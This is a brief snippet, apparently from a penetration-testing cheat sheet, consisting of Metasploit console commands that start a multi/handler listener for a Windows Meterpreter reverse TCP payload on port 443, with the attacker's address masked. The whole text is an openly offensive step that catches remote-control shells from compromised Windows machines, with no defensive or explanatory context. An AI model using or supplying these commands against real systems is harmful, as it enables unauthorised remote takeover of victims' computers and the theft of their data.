Start a meterpreter listener for Windows payload
------------------------------------------------
```bash
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST xxx.xxx.xxx.xxx
set LPORT 443
exploit
```
